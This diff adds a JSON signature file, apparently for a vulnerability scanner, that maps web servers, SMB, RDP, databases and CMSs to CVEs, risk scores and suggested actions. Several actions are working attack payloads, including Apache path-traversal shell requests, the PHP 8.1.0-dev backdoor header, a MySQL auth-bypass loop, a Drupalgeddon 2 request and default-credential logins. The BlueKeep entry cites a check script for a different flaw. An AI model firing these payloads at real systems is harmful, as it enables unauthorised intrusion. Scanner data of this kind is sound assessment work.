@@ -1,0 +1,202 @@
+{
+    "web": {
+        "apache": [
+            {
+                "match": "2.4.49",
+                "name": "CVE-2021-41773",
+                "risk": "CRITICAL",
+                "score": 95,
+                "desc": "Path Traversal & RCE",
+                "action": "curl -s --path-as-is http://<target>/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh"
+            },
+            {
+                "match": "2.4.50",
+                "name": "CVE-2021-42013",
+                "risk": "CRITICAL",
+                "score": 95,
+                "desc": "Incomplete fix for CVE-2021-41773",
+                "action": "curl -s --path-as-is http://<target>/cgi-bin/.%%32%65/.%%32%65/.%%32%65/bin/sh"
+            },
+            {
+                "match": "2.2",
+                "name": "Legacy Apache",
+                "risk": "MEDIUM",
+                "score": 50,
+                "desc": "Outdated Apache 2.2",
+                "action": "Check for Heartbleed if OpenSSL linked (if < 1.0.1g) or CVE-2011-3192 (DoS)."
+            }
+        ],
+        "nginx": [
+            {
+                "match": "1.20.1",
+                "name": "Nginx Misconfig",
+                "risk": "MEDIUM",
+                "score": 45,
+                "desc": "Potential alias traversal",
+                "action": "Check for off-by-slash in configuration."
+            },
+            {
+                "match": "1.1",
+                "name": "Nginx Information Disclosure",
+                "risk": "LOW",
+                "score": 20,
+                "desc": "Version tokens might be enabled",
+                "action": "Modify nginx.conf to server_tokens off;"
+            }
+        ],
+        "iis": [
+            {
+                "match": "6.0",
+                "name": "CVE-2017-7269",
+                "risk": "CRITICAL",
+                "score": 90,
+                "desc": "WebDAV ScStoragePathFromUrl RCE",
+                "action": "Use msf: exploit/windows/iis/iis_webdav_scstoragepathfromurl"
+            },
+            {
+                "match": "7.5",
+                "name": "IIS Shortname",
+                "risk": "MEDIUM",
+                "score": 55,
+                "desc": "8.3 file enumeration",
+                "action": "Use tool: iis-shortname-scanner-py"
+            },
+            {
+                "match": "10.0",
+                "name": "IIS Tilde Discovery",
+                "risk": "LOW",
+                "score": 30,
+                "desc": "Directory enumeration via ~",
+                "action": "Check for sensitive folders."
+            }
+        ],
+        "php": [
+            {
+                "match": "8.1.0-dev",
+                "name": "PHP 8.1.0-dev Backdoor",
+                "risk": "CRITICAL",
+                "score": 100,
+                "desc": "User-Agentt Backdoor",
+                "action": "Header 'User-Agentt: zerodium system(\"id\");'"
+            }
+        ]
+    },
+    "infra": {
+        "smb": [
+            {
+                "match": "all",
+                "name": "SMB Signing Disabled",
+                "risk": "HIGH",
+                "score": 85,
+                "desc": "Relay attack possible",
+                "action": "Check with nmap: nmap --script smb-security-mode -p445 <target>"
+            },
+            {
+                "match": "all",
+                "name": "SMB Null Session",
+                "risk": "HIGH",
+                "score": 80,
+                "desc": "Guest login allowed",
+                "action": "enum4linux -a <target>"
+            },
+            {
+                "match": "all",
+                "name": "EternalBlue Candidate",
+                "risk": "CRITICAL",
+                "score": 98,
+                "desc": "EternalBlue (MS17-010)",
+                "action": "nmap -p445 --script smb-vuln-ms17-010 <target>"
+            }
+        ],
+        "rdp": [
+            {
+                "match": "all",
+                "name": "BlueKeep Candidate",
+                "risk": "CRITICAL",
+                "score": 96,
+                "desc": "CVE-2019-0708",
+                "action": "Check with nmap: nmap -p3389 --script rdp-vuln-ms12-020 <target>"
+            }
+        ],
+        "ssh": [
+            {
+                "match": "libssh",
+                "name": "libssh Auth Bypass",
+                "risk": "CRITICAL",
+                "score": 92,
+                "desc": "CVE-2018-10933",
+                "action": "Attempt auth skip via MSG_USERAUTH_SUCCESS."
+            }
+        ]
+    },
+    "db": {
+        "mysql": [
+            {
+                "match": "all",
+                "name": "MySQL Default Root",
+                "risk": "HIGH",
+                "score": 88,
+                "desc": "No password for root",
+                "action": "mysql -h <target> -u root"
+            },
+            {
+                "match": "5.5",
+                "name": "CVE-2012-2122",
+                "risk": "HIGH",
+                "score": 85,
+                "desc": "Auth Bypass via password mismatch",
+                "action": "Run: for i in `seq 1 512`; do mysql -h <target> -u root --password=bad -e \"select 1\" 2>/dev/null && break; done"
+            }
+        ],
+        "redis": [
+            {
+                "match": "all",
+                "name": "Redis No Auth",
+                "risk": "HIGH",
+                "score": 90,
+                "desc": "Unauthenticated instance",
+                "action": "redis-cli -h <target> info"
+            }
+        ],
+        "postgresql": [
+            {
+                "match": "all",
+                "name": "PostgreSQL Default Creds",
+                "risk": "HIGH",
+                "score": 85,
+                "desc": "postgres/postgres default",
+                "action": "psql -h <target> -U postgres"
+            }
+        ]
+    },
+    "cms": {
+        "wordpress": [
+            {
+                "match": "all",
+                "name": "WordPress XML-RPC",
+                "risk": "MEDIUM",
+                "score": 40,
+                "desc": "Bruteforce / Pingback",
+                "action": "Check /xmlrpc.php for brute force via multicall."
+            },
+            {
+                "match": "all",
+                "name": "WordPress User Enum",
+                "risk": "LOW",
+                "score": 30,
+                "desc": "REST API user leak",
+                "action": "Access /wp-json/wp/v2/users"
+            }
+        ],
+        "drupal": [
+            {
+                "match": "all",
+                "name": "Drupalgeddon 2",
+                "risk": "CRITICAL",
+                "score": 99,
+                "desc": "CVE-2018-7600",
+                "action": "PoC: user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
+            }
+        ]
+    }
+}
